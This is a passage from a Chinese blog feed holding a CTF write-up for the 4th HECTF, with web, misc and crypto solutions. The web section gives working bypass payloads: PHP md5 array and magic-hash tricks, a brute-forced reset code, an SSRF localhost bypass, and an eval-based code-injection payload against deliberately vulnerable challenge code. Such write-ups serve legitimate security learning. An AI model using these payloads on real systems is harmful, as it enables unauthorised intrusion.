class="string">&quot;3c3f7068700d0a2f2f666c61677b36643633333362392d353564302d343266312d613236642d3663666439663361666238657d0d0a3f3e&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><?php//flag{6d6333b9-55d0-42f1-a26d-6cfd9f3afb8e}?></blockquote>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第四届HECTF write up</title>
      <link href="2020/11/22/%E7%AC%AC%E5%9B%9B%E5%B1%8AHECTF%20write%20up/"/>
      <url>2020/11/22/%E7%AC%AC%E5%9B%9B%E5%B1%8AHECTF%20write%20up/</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>题目：蛾子！你怎么跑到了。。。。php上？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>); </span><br><span class="line">$string_1 = $_GET[<span class="string">&#x27;str1&#x27;</span>]; </span><br><span class="line">$string_2 = $_GET[<span class="string">&#x27;str2&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;param1&#x27;</span>]!==$_GET[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_GET[<span class="string">&#x27;param1&#x27;</span>])===md5($_GET[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($string_1))&#123; </span><br><span class="line">        $md5_1 = md5($string_1); </span><br><span class="line">        $md5_2 = md5($string_2); </span><br><span class="line">        <span class="keyword">if</span>($md5_1 != $md5_2)&#123; </span><br><span class="line">            $a = strtr($md5_1, <span class="string">&#x27;cxhp&#x27;</span>, <span class="string">&#x27;0123&#x27;</span>); </span><br><span class="line">            $b = strtr($md5_2, <span class="string">&#x27;cxhp&#x27;</span>, <span class="string">&#x27;0123&#x27;</span>); </span><br><span class="line">            <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;you are close&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;md5 is wrong&quot;</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;str1 not number&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are wrong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><a id="more"></a><p>利用md5()不能加密数组，加密数组会返回false，所以<code>param1</code>和<code>param2</code>传值为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]&#x3D;1&amp;param2[]&#x3D;2</span><br></pre></td></tr></table></figure><p>接下要使得传进来的<code>str1</code>是纯数字，且<code>str1</code>和<code>str2</code>进行md5加密后的值不相等</p><p>然后对md5加密后的值进行替换后相等，最终得到flag</p><br><p>只要是以0e开头，后面为数字的两个字符串相等，所以</p><p><code>$a == $b</code>这里可以考虑这样绕过</p><p>纯数字的字符串md5加密后符合**<code>0e\d+</code>**的有<code>240610708</code>，即</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str1&#x3D;240610708</span><br></pre></td></tr></table></figure><p>因为在后面的替换中，会将<code>c</code>替换为<code>0</code>，所以<code>str2</code>进行md5加密后得以<code>ce</code>开头，这样才能使得<code>str1</code>和<code>str2</code>md5加密后的值不相等，替换后又能相等</p><p>而<code>str2</code>进行md5加密后，除开头的<code>ce</code>外，剩下部分只能是数字和字母cxhp</p><p>写脚本进行筛选</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;<span class="number">10000000</span>; $i++) &#123;</span><br><span class="line">$a = md5($i);</span><br><span class="line"><span class="keyword">if</span>(substr($a, <span class="number">0</span>, <span class="number">2</span>) == <span class="string">&#x27;ce&#x27;</span>) &#123;</span><br><span class="line">$end = substr($a, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[^0-9cxhp]/&#x27;</span>, $end)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;i=&quot;</span>.$i.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a=&quot;</span>.$a.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i&#x3D;9427417</span><br><span class="line">a&#x3D;ce156443c7c7c4c63366466c25317636</span><br></pre></td></tr></table></figure><p>所以<code>str2=9427417</code></p><p>联合起来即</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str1&#x3D;240610708&amp;str2&#x3D;9427417&amp;param1[]&#x3D;1&amp;param2[]&#x3D;2</span><br></pre></td></tr></table></figure><p><img src="https://s3.ax1x.com/2020/11/21/D3aJdU.png" alt="D3aJdU.png"></p><br><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>题目：登录就送flag~</p><p>hint：brute force</p><p><img src="https://s3.ax1x.com/2020/11/21/D3aDL6.png"></p><p>随便输个手机号和密码，提示手机或密码错误，查看源码发现手机号：<code>15970773575</code></p><p><img src="https://s3.ax1x.com/2020/11/21/D3ajln.png"></p><p>点击<code>忘记密码</code>，根据题目hint，使用暴力破解</p><p><img src="https://s3.ax1x.com/2020/11/21/D3dtnP.png"></p><p>用脚本生成4位纯数字的验证码</p><ul><li>4num.py</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0000</span>,<span class="number">9999</span>):</span><br><span class="line">    s = str(i).zfill(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;4num.txt&#x27;</span>,<span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(str(s) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure><p>用burp suite抓包，使用爆破模块进行爆破，其中<code>0233</code>的长度和其它明显不同</p><p><img src="https://s3.ax1x.com/2020/11/21/D3dgBV.png"></p><p>尝试后发现为正确的验证码，重设密码后重新登录即可拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;a9a102c0c06fcf6c8072c30f0a52f1f2&#125;</span><br></pre></td></tr></table></figure><br><h3 id="ssrfme"><a href="#ssrfme" class="headerlink" title="ssrfme"></a>ssrfme</h3><p>题目：绕过人海，走进服务器内心的世界。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//try flag.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$url</span>) </span>&#123; </span><br><span class="line">    $match_result=preg_match(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,$url); </span><br><span class="line">    <span class="keyword">if</span> (!$match_result) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $url_parse=parse_url($url); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> $e) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    $hostname=$url_parse[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">    $ip=gethostbyname($hostname); </span><br><span class="line">    $int_ip=ip2long($ip); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!filter($url))&#123;</span><br><span class="line">     <span class="keyword">echo</span> file_get_contents($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.getflag.cn/2020/10/22/%E6%B5%85%E8%B0%88ssrf%E4%B8%8Ectf%E9%82%A3%E4%BA%9B%E4%BA%8B/">【转载】浅谈ssrf与ctf那些事 | kawhi’s Blog (getflag.cn)</a></p><p><img src="https://s3.ax1x.com/2020/11/21/D3w5a8.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;[0:0:0:0:0:ffff:127.0.0.1]&#x2F;flag.php</span><br></pre></td></tr></table></figure><p><img src="https://s3.ax1x.com/2020/11/21/D3w7GQ.png"></p><br><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="【真签到题】快来看直播啦"><a href="#【真签到题】快来看直播啦" class="headerlink" title="【真签到题】快来看直播啦~"></a>【真签到题】快来看直播啦~</h3><p>题目：前往直播间，<del>调戏小蓝蓝</del>获取flag。</p><p>flag在直播屏幕里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;狮虎萌轻一点打出题人好吗嘤嘤嘤&#125;</span><br></pre></td></tr></table></figure><br><h3 id="png"><a href="#png" class="headerlink" title="png"></a>png</h3><p>题目：好可爱的小猫咪鸭~</p><p>下载后是一张图片：<code>flag.png</code></p><p>拖到010 Editor里，在末尾发现这个</p><p><img src="https://s3.ax1x.com/2020/11/22/D8bYa6.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M2I3OWJkZjhmY2ZkNTVmZH0&#x3D;</span><br></pre></td></tr></table></figure><p>base64解密后得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3b79bdf8fcfd55fd&#125;</span><br></pre></td></tr></table></figure><p>差了前半段，尝试调整图片高度，将<code>02 BC</code>改为<code>04 20</code></p><p><img src="https://s3.ax1x.com/2020/11/22/D8bILn.png"></p><p>在图片最下看到前半段的flag</p><p><img src="https://s3.ax1x.com/2020/11/22/D8qy6J.png"></p><p>合起来得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;94ed7fdae8f504743b79bdf8fcfd55fd&#125;</span><br></pre></td></tr></table></figure><br><h3 id="不说人话"><a href="#不说人话" class="headerlink" title="不说人话"></a>不说人话</h3><p>题目：阴阳怪气？！</p><p>使用<a href="https://www.splitbrain.org/services/ook">Ook编解码在线工具</a>，得到flag</p><p><img src="https://s3.ax1x.com/2020/11/22/D8OrL9.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;TH1s_1s_crypt0_914nda0&#125;</span><br></pre></td></tr></table></figure><br><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>参考：<a href="https://mp.weixin.qq.com/s/SWjgzRRm8-RKCRRSrLYbRw">https://mp.weixin.qq.com/s/SWjgzRRm8-RKCRRSrLYbRw</a></p><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>题目：Sunned是一个linux小白，突然有一天想学渗透，她请教了某大佬，大佬说，首先的你得先学会搭建环境，然后，然后，Sunned就跟着网上的教程先搭建了一个web服务器，搭建好之后大佬给她上了一个题目。</p><p>hint：一个小姑娘走丢了，她的家人担心地到处找，一边找一边喊：贝丝！你在哪？？ L2V0Yy9jcm9udGFi</p><p>查看源码发现</p><p><img src="https://s3.ax1x.com/2020/11/21/D3wXq0.png"></p><p>php弱类型比较问题，利用md5不能加密数组绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You need the file is .&#x2F;3b8cf4731c36d20776c76e20f9c774c7.php</span><br></pre></td></tr></table></figure><p>访问该路径</p><p><img src="https://s3.ax1x.com/2020/11/22/D30ks1.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">@$data&#x3D;$_POST[&#39;data&#39;];</span><br><span class="line">$file&#x3D;$_POST[&#39;file&#39;];</span><br><span class="line">if($file!&#x3D;&quot;&#x2F;xxx&quot;)</span><br><span class="line">die(&quot;你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径&quot;);</span><br><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $data)) &#123;</span><br><span class="line">echo &quot;great!!!!你需要看看源码&quot;;</span><br><span class="line">file_put_contents($file,&quot;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径</span><br></pre></td></tr></table></figure><p>根据提示的<code>L2V0Yy9jcm9udGFi</code>，进行base64解码，得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;crontab</span><br></pre></td></tr></table></figure><p>访问该路径</p><p><img src="https://s3.ax1x.com/2020/11/22/D30ZdK.png"></p><p>尝试传参，并访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;phpinfo();&amp;file&#x3D;&#x2F;very_g00d_Y0u_got_it.php</span><br></pre></td></tr></table></figure><p><img src="https://s3.ax1x.com/2020/11/22/D30GeP.png"></p><p>get_defined_vars() 会返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(get_defined_vars());</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">array(4) &#123;</span></span><br><span class="line"><span class="comment">  [&quot;_GET&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  array(0) &#123;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  [&quot;_POST&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  array(0) &#123;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  [&quot;_COOKIE&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  array(0) &#123;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  [&quot;_FILES&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  array(0) &#123;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;eval(pos(next(get_defined_vars())));&amp;file&#x3D;&#x2F;very_g00d_Y0u_got_it.php</span><br></pre></td></tr></table></figure><blockquote><p>或：</p><p>data=eval(end(current(get_defined_vars())));&amp;file=/very_g00d_Y0u_got_it.php</p></blockquote><p><img src="https://s3.ax1x.com/2020/11/22/D8fMgx.png"></p><p><img src="https://s3.ax1x.com/2020/11/24/DUeG5R.png"></p><p>执行命令</p><p><img src="https://s3.ax1x.com/2020/11/24/DUmKJI.png"></p><blockquote><p><code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code> base64解密后为 <code>fl4ggggggggggggCg</code></p><p>也可以读取<code>3b8cf4731c36d20776c76e20f9c774c7.php</code>，从注释知道flag所在文件</p></blockquote><p>读取<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>，得到flag</p><p><img src="https://s3.ax1x.com/2020/11/24/DUm6w4.png"></p><ul><li><code>3b8cf4731c36d20776c76e20f9c774c7.php</code></li></ul><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">@$data=$_POST[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">$file=$_POST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>($file!=<span class="string">&quot;/xxx&quot;</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $data)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;great!!!!你需要看看源码&quot;</span>;</span><br><span class="line">file_put_contents($file,<span class="string">&quot;&lt;?php &quot;</span>.\$data.<span class="string">&quot; ?&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$data=$_POST[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">$file=$_POST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>($file!=<span class="string">&quot;/very_g00d_Y0u_got_it.php&quot;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $data))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonono &quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;great!!!!&quot;</span>;</span><br><span class="line">    @file_put_contents($file,<span class="string">&quot;&lt;?php &quot;</span>.$data.<span class="string">&quot; ?&gt;&quot;</span>);</span><br><span class="line">    <span class="comment">//你想要的文件是   Zmw0Z2dnZ2dnZ2dnZ2dnCg</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/html&gt;&gt;</span><br></pre></td></tr></table></figure><br><h3 id="在这里签到"><a href="#在这里签到" class="headerlink" title="在这里签到"></a>在这里签到</h3><p>题目：经典套娃 有手就…</p><ul><li>enc.txt</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX18DxoLgtTzVee++9JZw790ngjGfxdjjjeWt9m9jL2O3NJuKB&#x2F;&#x2F;4O3BHTnelg2z+o2vE0AxVKPobIFVgKxqbpkr94XYPNZFbbFykHWBMArdVT8FuH7dyvHDrLe7D35p654UEy2Yn0FepbJ7BHcn9Gu9xg7eqVcovB6KfMivcXw49JyZWbWtb0SZKpA0hRgI2tNeQ8lsRZRkoaI9CECyphItxLd0bO58phQjv70M&#x2F;e30tsFpEmPo&#x3D;</span><br></pre></td></tr></table></figure><p>rabbit解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R1E0RElOSlVHTTJUSU5CV0c1QkRHTkJUR01aVFFOUlRHWTJER05SVEdVWlRJTlJVR1laVEdPQlRHVTNES05SVkdZWlRHTkpUR0kzREdOUlZHWTJETU1KV0dJWlRJTVpaR1kyREdNWldHUVpURU5SV0dNM1RNTkpXR0UzVUk9PT0&#x3D;</span><br></pre></td></tr></table></figure><p>base64解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GQ4DINJUGM2TINBWG5BDGNBTGMZTQNRTGY2DGNRTGUZTINRUGYZTGOBTGU3DKNRVGYZTGNJTGI3DGNRVGY2DMMJWGIZTIMZZGY2DGMZWGQZTENRWGM3TMNJWGE3UI&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base32解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">48454354467B34333863643635346463383565656335326365646162343964336432663765617D</span><br></pre></td></tr></table></figure><p>十六进制转字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;438cd654dc85eec52cedab49d3d2f7ea&#125;</span><br></pre></td></tr></table></figure><br><h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><p>题目：RRRRRRRSSSSSSSSAAAAAAA<del>~</del></p><ul><li>rsa.txt</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; 11419768903339716189261532371559705252086398275876008505047375123074727093589680611869748263351554093957968142343831331654606932684767042958427409579115435445187908134556329979271179879129295667476493886787230948520371350715808988496083694717544298343260369816980228394498856751096191942011545898984240281874509791880690092840536597771674772617299407710771426964764347566008897012753022763270832647775571317162594044338095870404550665457899223394942640876850692848671826594750236910363027949459768124646230555766323417693441861436560072288812137944884954974348317322412816157152702695143094487806945533233359294549423</span><br><span class="line">e &#x3D; 65537</span><br><span class="line">c &#x3D; 575061710950381118206735073806398116370706587076775765253483131078316908073202143802386128272374323616239083134747318254436706806781744501903333604772961927966747648954315962269321297121495398057938617145017999482722197661065698707836824505023856306403892307944203245563411961302499347604417024064678999003637933185177922884103362203639349298263339808508185861692596967147081382566246627668898774233029198694500565511361867375668367875805985660705137109665107860799277624050210666866958502948062330037309873148963011192405012811945540153592090345668265964477204465327474208098404082920129178960510763496025906621820</span><br></pre></td></tr></table></figure><p>首先分解p、q，使用<a href="http://factordb.com/%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86">http://factordb.com/在线解密</a></p><p><img src="https://s3.ax1x.com/2020/11/25/DUnK74.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">11419768903339716189261532371559705252086398275876008505047375123074727093589680611869748263351554093957968142343831331654606932684767042958427409579115435445187908134556329979271179879129295667476493886787230948520371350715808988496083694717544298343260369816980228394498856751096191942011545898984240281874509791880690092840536597771674772617299407710771426964764347566008897012753022763270832647775571317162594044338095870404550665457899223394942640876850692848671826594750236910363027949459768124646230555766323417693441861436560072288812137944884954974348317322412816157152702695143094487806945533233359294549423</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">575061710950381118206735073806398116370706587076775765253483131078316908073202143802386128272374323616239083134747318254436706806781744501903333604772961927966747648954315962269321297121495398057938617145017999482722197661065698707836824505023856306403892307944203245563411961302499347604417024064678999003637933185177922884103362203639349298263339808508185861692596967147081382566246627668898774233029198694500565511361867375668367875805985660705137109665107860799277624050210666866958502948062330037309873148963011192405012811945540153592090345668265964477204465327474208098404082920129178960510763496025906621820</span></span><br><span class="line">p = <span class="number">2499568793</span></span><br><span class="line">q = <span class="number">4568695582742345507136251229217400959960856046691733722988345503429689799935696593516299458516865110324638359470761456115925725067558499862591063153473862179550706262380644940013531317571260647226561004191266100720745936563550699000939117068559232225644277283541933064331891245169739139886735615435506152070330233107807124410892978280063993668726927377177983100529270996547002022341628251905780873531481682713820809147098305289391835297208890779643623465917824350382592808578978330348769060448006691307027594085634520759293965723855183484366752511654099121387261343686017189426761536281948007104498017003911</span></span><br><span class="line">phi = (p<span 